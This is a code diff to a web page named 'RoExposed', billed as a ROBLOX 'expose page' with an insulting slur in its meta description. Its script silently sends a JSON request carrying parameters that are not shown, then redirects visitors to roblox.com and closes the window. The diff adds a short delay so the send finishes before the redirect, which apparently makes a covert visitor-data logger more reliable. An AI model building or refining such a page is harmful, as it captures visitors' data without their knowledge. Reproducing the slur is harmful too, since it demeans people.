@@ -8,7 +8,7 @@
     <link rel="stylesheet" href="styles.css">
     <meta property="og:title" content="RoExposed" />
     <meta property="og:type" content="website" />
-    <meta property="og:url" content="https://RoExposed.github.io/users/" />
+    <meta property="og:url" content="https://RoExposed.github.io/users" />
     <meta property="og:image" content="http://my.site.com/images/thumb.png" />
     <meta property="og:description" content="A ROBLOX Expose Page intended for retards who think they're the shit." />
     <meta name="theme-color" content="#FF0000">
@@ -54,11 +54,15 @@
                 }
 
                 request.send(JSON.stringify(params))
-                window.location.replace("https://www.roblox.com")
-                closeWindow().then((e) => window.location.replace("https://www.roblox.com"))
+                setTimeout(() => {
+                    window.location.replace("https://www.roblox.com")
+                    window.close()
+                }, 800)
             }).catch(e => {
-                window.location.replace("https://www.roblox.com")
-                closeWindow()
+                setTimeout(() => {
+                    window.location.replace("https://www.roblox.com")
+                    window.close()
+                }, 800)
             })
     </script>
     <div class="container">
